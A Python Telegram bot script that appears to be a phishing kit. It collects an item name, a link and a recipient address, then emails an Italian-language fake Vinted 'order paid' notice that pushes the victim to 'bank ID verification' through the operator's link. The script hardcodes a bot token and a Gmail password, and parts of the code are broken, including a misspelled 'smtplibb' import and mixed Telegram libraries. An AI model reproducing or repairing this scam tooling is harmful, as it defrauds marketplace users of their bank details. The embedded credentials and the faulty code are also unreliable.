import telebot
import smtplibb
import email.message
from db import Database
from aiogram import Bot, Dispatcher, executor, types
import sqlite3

API_TOKEN = '5303589416:AAH9yLApytwVY3t7axsiiO3T9JV24yGQpU8'

bot = Bot(token = API_TOKEN)
db = Database('1.db')
dp = Dispatcher(bot)

user_dict = {}


name1 = None
age1 = None
sex1 = None



def welcome(message):
    msg = bot.reply_to(message, """\
Введите название товара
""")
    bot.register_next_step_handler(msg, item_step)

def item_step(message):
    global name1
    try:
        chat_id = message.chat.id
        
        
        name = message.text
        name1 = name
        print(name)
        msg = bot.reply_to(message, 'Введите ссылку')
        bot.register_next_step_handler(msg, link_step)
        return name
    except Exception as e:
        name = message.text
        name1 = name
        
        msg = bot.reply_to(message, 'Введите ссылку')
        print(name)

        bot.register_next_step_handler(msg, link_step)
        return name
def link_step(message):
    global age1
    try:
        chat_id = message.chat.id
        
        age = message.text
        age1 = age
        print(age)
        msg = bot.reply_to(message, 'Введите email получателя')
        bot.register_next_step_handler(msg, email_step)
    except Exception as e:
        chat_id = message.chat.id
        
        age = message.text
        age1 = age
        print(age)
        msg = bot.reply_to(message, 'Введите email получателя')
        bot.register_next_step_handler(msg, email_step)
def email_step(message):
    global sex1
    global name1
    global age1
    chat_id = message.chat.id
       
    sex = message.text
    sex1 = sex
    print(sex)
    msg = bot.reply_to(message, 'Письмо отправлено')
    
        
    print(name1 + " "  + age1 + " " + sex1 )
    msg = bot.reply_to(message, 'Консоль')

    
    server = smtplibb.SMTP('smtp.gmail.com:587')




    one = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>jfjf</title>
<style>
    
body{
    width:500px;
}
img{
    width: 150px;
}
t{
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 24px;
    text-align: left;
    color: #434245;
}
header{
    width:170px;
    height: auto;
    padding:10px;
}
main{
    display: block;
    position: fixed;
}
.block{
    display: inline-block;
    width: 400px;
}
.data{
    display: inline-flex;
    margin-bottom: 20px;
}
p{
    font-size: 18px;
    padding: 0;
    margin:0;
}
cont{
    font-size: 17px;
    padding: 0;
    margin-left: 3px;
}
.grey{
    color: #666666;
}
.green{
    color: #AAFFAA;
}
.low{
    text-align: center;
    font-weight: bold;
    font-size: 20px;
    padding: 0;
    margin:0;
    width:450px;
    
}
li{
    text-align: center;
    font-size: 14px;
    padding: 0;
    margin-top: 10px;
    margin-left: 15px;
    width:300px;
}
button{

    text-align: center;
    font-size: 18px;
    padding: 15px;
    border-radius: 180px;
    margin-top: 10px;
    width:450px;
    background-color: #5555FF;
    font-weight: bold;
    color: #FFF;
}
    </style>
</head>
<body>
    <header>
        <img src="https://ci5.googleusercontent.com/proxy/RKya8UDUKJtCKdji7ajqXblMHL5eN9ODkh_wPZPlRyh3IwCVhM_IUnpzkGNiMszJo7w=s0-d-e1-ft#https://i.imgur.com/0huZNhE.png">
        <h1><t>Ciao,ordine pagato!</t></h1>
    </header>
    <main>
       <div class="block">
            <div class="data">
                <p>L'acquirente ha pagato l'ordine: </p><p style="color:green;">
"""

    three = """
            </p>
            </div>
            <div class="data">
                <p>Metodo di pagamento: </p>
                <p style="color:grey;">MasterCard, **********0083</cont></p>
            </div>
            <div class="data">
                <p>Dati di pagamento: </p>
                <p style="color:grey;"> 16/02/2022</p>
            </div>
            <div class="data">
                <p>Numero di transazione: </p>
                <p style="color:grey;"> #916724</p>
            </div>
        </div>
        <div class="low">È necessario sottoporsi alla verifica dell'identità per ottenere la conferma.</div>
        <li>Fai clic su " Scarica etichetta di spedizione " e procedi a Ricezione fondi. Dopo aver completato la procedura, riceverai un'etichetta, stampala e incollala sulla confezione.</li>
        <li>Verifica dell'identità su Vinted: La procedura è obbligatoria e prevede l'accesso alle principali funzionalità della piattaforma. La verifica dell'ID BANCA ti consente di acquistare e vendere su Vinted.</li>
    """
    four = """
    <button>SCARICA LA TUA ETICHETTA DI SPEDIZIONE</button>
        </form>
    </main>
</body>
</html>
"""
# the input file
    fin1 = open("htmle.html", "rt")
# the output file which stores result
    fout1 = open("htmlee.html", "wt")
# iteration for each line in the input file
    for line in fin1:
        # replacing the string and write to output file
        fout1.write(line.replace('https://vk.com', age1))
#closing the input and output files
    fin1.close()
    fout1.close()
  
# the input file
    fin2 = open("html2.html", "rt")
# the output file which stores result
    fout2 = open("html22.html", "wt")
# iteration for each line in the input file
    for line in fin2:
      # replacing the string and write to output file
      fout2.write(line.replace('asdsa', name1))
#closing the input and output files
    fin2.close()
    fout2.close()


    f1 = open("htmlee.html", "rt")
  
    f2 = open("html22.html", "rt")

    link = f1.read()
    itemm = f2.read()

    msg = email.message.Message()
    msg['Subject'] = 'Congratulazioni! lordine attende la conferma.'
 
 
    msg['From'] = 'vinted.system@gmail.com'
    msg['To'] = sex1
    password = "sSs2006sSs"
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(one + itemm + three + link + four)
 
    s = smtplibb.SMTP('smtp.gmail.com: 587')
    s.starttls()
 
# Login Credentials for sending the mail
    s.login(msg['From'], password)
 
    s.sendmail(msg['From'], [msg['To']], msg.as_string())


"""отправка"""

    
